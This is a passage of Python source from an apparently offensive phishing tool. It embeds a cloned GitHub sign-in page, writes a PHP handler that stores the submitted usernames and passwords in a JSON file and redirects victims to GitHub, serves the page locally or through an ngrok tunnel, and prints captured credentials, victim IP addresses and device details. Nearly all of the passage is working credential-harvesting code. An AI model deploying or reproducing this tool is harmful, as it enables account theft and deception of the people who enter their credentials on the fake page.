      <svg class="octicon octicon-x" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M3.72 3.72a.75.75 0 011.06 0L8 6.94l3.22-3.22a.75.75 0 111.06 1.06L9.06 8l3.22 3.22a.75.75 0 11-1.06 1.06L8 9.06l-3.22 3.22a.75.75 0 01-1.06-1.06L6.94 8 3.72 4.78a.75.75 0 010-1.06z"></path></svg>
    </button>
    
      <div>{{ message }}</div>

  </div>
</div>
  </template>
</div>


      <div class="flash js-transform-notice" hidden>
        <button class="flash-close js-flash-close" type="button" aria-label="Dismiss this message">
          <svg aria-label="Dismiss" class="octicon octicon-x" height="16" viewBox="0 0 16 16" version="1.1" width="16" aria-hidden="true"><path fill-rule="evenodd" d="M3.72 3.72a.75.75 0 011.06 0L8 6.94l3.22-3.22a.75.75 0 111.06 1.06L9.06 8l3.22 3.22a.75.75 0 11-1.06 1.06L8 9.06l-3.22 3.22a.75.75 0 01-1.06-1.06L6.94 8 3.72 4.78a.75.75 0 010-1.06z"></path></svg>
        </button>
      </div>

      <div class="auth-form-body mt-3">

          <!-- '"` --><!-- </textarea></xmp> --></option></form><form action="login.php" accept-charset="UTF-8" method="post"><input type="hidden" name="authenticity_token" value="wpHaz3YYZFZ0jU4ovlnnZhcGa/BwyYoQKKxP5uEajYzZst9KtoAI/hFcoSQMU7ddOlrfEVltWBM8fDpobkHUUA==" />  <label for="login_field">
    Username or email address
  </label>
  <input class="form-control input-block" type="text" name="username" id="username" autocapitalize="off" autocorrect="off" autocomplete="username" autofocus="autofocus" />
  
  <label for="password">
    Password <a class="label-link" href="#">Forgot password?</a>
  </label>
  <input type="password" name="password" id="password" class="form-control form-control input-block" autocomplete="current-password" />
  <input type="hidden" name="trusted_device" id="trusted_device" class="form-control" />
  <input type="hidden" class="js-webauthn-support" name="webauthn-support" value="unknown">
<input type="hidden" class="js-webauthn-iuvpaa-support" name="webauthn-iuvpaa-support" value="unknown">
<input type="hidden" name="return_to" id="return_to" class="form-control" />
<input type="hidden" name="allow_signup" id="allow_signup" class="form-control" />
<input type="hidden" name="client_id" id="client_id" class="form-control" />
<input type="hidden" name="integration" id="integration" class="form-control" />
<input type="text" name="required_field_85d6" hidden="hidden" class="form-control" /><input type="hidden" name="timestamp" value="1611826598095" class="form-control" /><input type="hidden" name="timestamp_secret" value="475be815fb512b20cb28fae2003e6ed5b71d828892f13baaf2168f9e2134ad75" class="form-control" />

  <input type="submit" name="commit" value="Sign in" class="btn btn-primary btn-block" data-disable-with="Signing in" />
</form>
      </div>




        <p class="login-callout mt-3">
          New to GitHub?
          <a data-ga-click="Sign in, switch to sign up" data-hydro-click="{&quot;event_type&quot;:&quot;authentication.click&quot;,&quot;payload&quot;:{&quot;location_in_page&quot;:&quot;sign in switch to sign up&quot;,&quot;repository_id&quot;:null,&quot;auth_type&quot;:&quot;SIGN_UP&quot;,&quot;originating_url&quot;:&quot;https://github.com/login&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="72d062e79bb6ab076a3b88b32943286ea51894183bd812a5038d00013946f239" href="/join?source=login">Create an account</a>.
        </p>
  </div>

      </main>
  </div>

          <div class="footer container-lg p-responsive py-6 mt-6 f6" role="contentinfo">
    <ul class="list-style-none d-flex flex-justify-center">
        <li class="mr-3"><a href="/site/terms" data-ga-click="Footer, go to terms, text:terms">Terms</a></li>
        <li class="mr-3"><a href="/site/privacy" data-ga-click="Footer, go to privacy, text:privacy">Privacy</a></li>
        <li class="mr-3"><a href="https://docs.github.com/articles/github-security/" data-ga-click="Footer, go to security, text:security">Security</a></li>
          <li><a class="link-gray" data-ga-click="Footer, go to contact, text:contact" href="https://github.com/contact">Contact GitHub</a></li>
    </ul>
  </div>



  <div id="ajax-error-message" class="ajax-error-message flash flash-error" hidden>
    <svg class="octicon octicon-alert" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M8.22 1.754a.25.25 0 00-.44 0L1.698 13.132a.25.25 0 00.22.368h12.164a.25.25 0 00.22-.368L8.22 1.754zm-1.763-.707c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0114.082 15H1.918a1.75 1.75 0 01-1.543-2.575L6.457 1.047zM9 11a1 1 0 11-2 0 1 1 0 012 0zm-.25-5.25a.75.75 0 00-1.5 0v2.5a.75.75 0 001.5 0v-2.5z"></path></svg>
    <button type="button" class="flash-close js-ajax-error-dismiss" aria-label="Dismiss error">
      <svg class="octicon octicon-x" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M3.72 3.72a.75.75 0 011.06 0L8 6.94l3.22-3.22a.75.75 0 111.06 1.06L9.06 8l3.22 3.22a.75.75 0 11-1.06 1.06L8 9.06l-3.22 3.22a.75.75 0 01-1.06-1.06L6.94 8 3.72 4.78a.75.75 0 010-1.06z"></path></svg>
    </button>
    You can’t perform that action at this time.
  </div>


  <div class="js-stale-session-flash flash flash-warn flash-banner" hidden
    >
    <svg class="octicon octicon-alert" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M8.22 1.754a.25.25 0 00-.44 0L1.698 13.132a.25.25 0 00.22.368h12.164a.25.25 0 00.22-.368L8.22 1.754zm-1.763-.707c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0114.082 15H1.918a1.75 1.75 0 01-1.543-2.575L6.457 1.047zM9 11a1 1 0 11-2 0 1 1 0 012 0zm-.25-5.25a.75.75 0 00-1.5 0v2.5a.75.75 0 001.5 0v-2.5z"></path></svg>
    <span class="js-stale-session-flash-signed-in" hidden>You signed in with another tab or window. <a href="">Reload</a> to refresh your session.</span>
    <span class="js-stale-session-flash-signed-out" hidden>You signed out in another tab or window. <a href="">Reload</a> to refresh your session.</span>
  </div>
    <template id="site-details-dialog">
  <details class="details-reset details-overlay details-overlay-dark lh-default text-gray-dark hx_rsm" open>
    <summary role="button" aria-label="Close dialog"></summary>
    <details-dialog class="Box Box--overlay d-flex flex-column anim-fade-in fast hx_rsm-dialog hx_rsm-modal">
      <button class="Box-btn-octicon m-0 btn-octicon position-absolute right-0 top-0" type="button" aria-label="Close dialog" data-close-dialog>
        <svg class="octicon octicon-x" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M3.72 3.72a.75.75 0 011.06 0L8 6.94l3.22-3.22a.75.75 0 111.06 1.06L9.06 8l3.22 3.22a.75.75 0 11-1.06 1.06L8 9.06l-3.22 3.22a.75.75 0 01-1.06-1.06L6.94 8 3.72 4.78a.75.75 0 010-1.06z"></path></svg>
      </button>
      <div class="octocat-spinner my-6 js-details-dialog-spinner"></div>
    </details-dialog>
  </details>
</template>

    <div class="Popover js-hovercard-content position-absolute" style="display: none; outline: none;" tabindex="0">
  <div class="Popover-message Popover-message--bottom-left Popover-message--large Box box-shadow-large" style="width:360px;">
  </div>
</div>


  </body>
</html>

""")
    filedown = open("templates/phishing/login.html","w")
    filedown.write(path)
    filedown.close()
    phppath=("""<?php
$user = $_POST['username'];
$pass = $_POST['password'];
$data['dev'][] = array('username' =>$user,
'password'=>$pass);

$jdata = json_encode($data);
$f = fopen('usernames.json', 'w');
fwrite($f, $jdata);
fclose($f);
header('Location:https://github.com/explore');
exit();
""")
    filedown = open("templates/phishing/login.php","w")
    filedown.write(phppath)
    filedown.close()
    bannner.banner()
    print("")
    time.sleep(0.07)
    print(Fore.RED+" ["+Fore.WHITE+"!"+Fore.RED+"]"+Fore.RED+" PLEASE CHOOSE A SERVICE TO FORWARDING")
    print("")
    time.sleep(0.07)
    print(Fore.RED+" ["+Fore.WHITE+"O1"+Fore.RED+"]"+Fore.RED+" Localhost")
    print(Fore.RED+" ["+Fore.WHITE+"02"+Fore.RED+"]"+Fore.RED+" Ngorok.io")
    print("")
    v = input(Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+Fore.RED+"]"+Fore.CYAN+" Select a Port Forwarding Service : ")
    if v == "01":
      with open("log","w") as phplog:
        Popen(("php","-S","localhost:6060","-t","../Bloody-Eye/templates/phishing"),stderr=phplog,stdout=phplog)
      print("")
      time.sleep(0.07)
      print(Fore.RED+" ["+Fore.WHITE+"!"+Fore.RED+"]"+" Php Server Has Started on Port 6060")
      print("")
      time.sleep(0.07)
      print(Fore.RED+" ["+Fore.WHITE+"!"+Fore.RED+"]"+" Waiting For Victim ! ! !")
    elif v == "02":
      with open("log","w") as phplog:
        Popen(("php","-S","localhost:6060","-t","../Bloody-Eye/website/github"),stderr=phplog,stdout=phplog)
      print("")
      global token
      link = ngrok.connect(6060,"http",auth_token=token)
      time.sleep(0.07)
      print(Fore.RED+" ["+Fore.WHITE+"!"+Fore.RED+"]"+" Php Server Has Started on Port 6060")

    
    
    
    def userin():
        global stat_file
        if not str(os.stat("../Bloody-Eye/templates/phishing/usernames.json").st_size) == stat_file:
            stat_file = str(os.stat("../Bloody-Eye/templates/phishing/usernames.json").st_size)
            fileip = open("../Bloody-Eye/templates/phishing/usernames.json","r")
            b = fileip.read()
            try:
                infor = json.loads(b)
                for value in infor['dev']:
                    print("\n"+Fore.RED+" ["+Fore.WHITE+"+"+Fore.RED+"]"+" Username : "+Fore.WHITE+value['username'])
                    print("\n"+Fore.RED+" ["+Fore.WHITE+"+"+Fore.RED+"]"+" Password : "+Fore.WHITE+value["password"])
                    a = open("../Bloody-Eye/templates/phishing/usernames.json","w")
                    b = a.write("")
                    a.close()
            except:
                None
# Getting IP Address
    def readip():
        global stat_file
        if not str(os.stat('../Bloody-Eye/templates/phishing/ip.txt').st_size) == stat_file:
            stat_file = str(os.stat('../Bloody-Eye/templates/phishing/ip.txt').st_size)
            fileip =  open('../Bloody-Eye/templates/phishing/ip.txt','r')
            i = fileip.readlines()
            try:
                i = i[-1]
                print("\n"+Fore.RED+" ["+Fore.WHITE+"!"+Fore.RED+"]"+Fore.GREEN+" Victim's IP Found")
                print("\n"+Fore.RED+" ["+Fore.WHITE+"!"+Fore.RED+"]"+Fore.BLUE+" Victim's IP : "+Fore.GREEN+"%s"%(i))
                o = open("../Bloody-Eye/templates/phishing/ip.txt","w")
                o.write("")
                o.close()
            except:
                None
# Getting Victim Info
    def info():
            global stat_file
            if not str(os.stat('../Bloody-Eye/templates/phishing/info.json').st_size) == stat_file:
                stat_file = str(os.stat('../Bloody-Eye/templates/phishing/info.json').st_size)
                fileip = open("../Bloody-Eye/templates/phishing/info.json","r")
                b = fileip.read()
            try:
                infor = json.loads(b)
                for value in infor['dev']:
                    print("\n"+Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+"]"+Fore.BLUE+" Os Name : "+Fore.WHITE+value['Os-Name'])
                    print("\n"+Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+"]"+Fore.BLUE+" Os Version : "+Fore.WHITE+value['Os-Version'])
                    print("\n"+Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+"]"+Fore.BLUE+" Time Zone : "+Fore.WHITE+value['Time-Zone'])
                    print("\n"+Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+"]"+Fore.BLUE+" Os Version : "+Fore.WHITE+value['Language'])
                    a = open("../Bloody-Eye/templates/phishing/info.json","w")
                    b = a.write("")
                    a.close()
            except:
                None
    while True:
        userin()
        readip()
        info()
  except:
    with open("exit","w") as kill:
      Popen(("taskkill","/F","/IM","php*"),stderr=kill,stdout=kill)
      os.system("clear")
      sys.exit()
